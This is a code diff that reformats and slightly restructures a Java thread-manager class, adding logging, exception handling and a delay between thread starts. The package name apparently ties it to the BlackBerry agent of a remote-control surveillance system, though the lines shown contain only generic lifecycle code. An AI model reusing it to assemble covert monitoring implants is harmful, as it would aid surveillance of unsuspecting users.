@@ -26,7 +26,7 @@ import com.ht.rcs.blackberry.utils.Utils;
  */
 public abstract class Manager {
 
-	//#debug
+    //#debug
     private static Debug debug = new Debug("Manager", DebugLevel.VERBOSE);
 
     /** The status obj. */
@@ -66,13 +66,13 @@ public abstract class Manager {
      */
     public boolean reStart(int id) {
         // #debug
-         debug.trace("restart " + id);
+        debug.trace("restart " + id);
         boolean ret = true;
 
         StartStopThread thread = getItem(id);
         if (thread == null) {
             // #debug
-             debug.error("Thread unknown: " + id);
+            debug.error("Thread unknown: " + id);
             return false;
         }
 
@@ -80,9 +80,8 @@ public abstract class Manager {
             thread.restart();
         } else {
             // #mdebug
-             debug.error("cannot restart: " + id +
-             " enabled:" + isEnabled(id)
-             + " running:" + isRunning(id));
+            debug.error("cannot restart: " + id + " enabled:" + isEnabled(id)
+                    + " running:" + isRunning(id));
             // #enddebug
         }
         return ret;
@@ -100,25 +99,25 @@ public abstract class Manager {
         StartStopThread thread = getItem(id);
         if (thread == null) {
             // #debug
-             debug.error("Thread unknown: " + id);
+            debug.error("Thread unknown: " + id);
             return false;
         }
 
         if (!thread.isEnabled()) {
             // #debug
-             debug.error("Not enabled [0] " + id);
+            debug.error("Not enabled [0] " + id);
             return false;
         }
 
         if (thread.isRunning()) {
             // #debug
-             debug.info("Start RUNNING" + id);
+            debug.info("Start RUNNING" + id);
             return true;
         }
 
         thread.start();
         // #debug
-         debug.trace("Start() OK");
+        debug.trace("Start() OK");
         return true;
     }
 
@@ -130,19 +129,37 @@ public abstract class Manager {
      */
     public final boolean startAll() {
         Vector threads = getAllItems();
-
         int tsize = threads.size();
+
+        //#mdebug
         for (int i = 0; i < tsize; ++i) {
             StartStopThread thread = (StartStopThread) threads.elementAt(i);
+            debug.trace("Thread to start: " + thread);
+            thread = null;
+        }
+        //#enddebug
 
-            if (thread.isEnabled()) {
-                thread.start();
-                //Utils.sleep(500);
+        try {
+            for (int i = 0; i < tsize; ++i) {
+                StartStopThread thread = (StartStopThread) threads.elementAt(i);
+
+                if (thread.isEnabled()) {
+                    // #debug
+                    debug.trace("Starting: " + thread);
+                    thread.start();
+                } else {
+                    // #debug
+                    debug.trace("Not starting because disabled: " + thread);
+                }
+                
+                Utils.sleep(1000);
             }
+        } catch (Exception ex) {
+            debug.error(ex.toString());
         }
 
         // #debug
-         debug.trace("StartAll() OK");
+        debug.trace("StartAll() OK");
         return true;
     }
 
@@ -165,7 +182,7 @@ public abstract class Manager {
                 thread.join();
             } catch (InterruptedException e) {
                 // #debug
-                 debug.error("Interrupted");
+                debug.error("Interrupted");
             }
         }
 
@@ -190,13 +207,13 @@ public abstract class Manager {
                     thread.join();
                 } catch (InterruptedException e) {
                     // #debug
-                     debug.error("Interrupted");
+                    debug.error("Interrupted");
                 }
             }
         }
 
         // #debug
-         debug.trace("StopAll() OK");
+        debug.trace("StopAll() OK");
         return true;
     }
 }
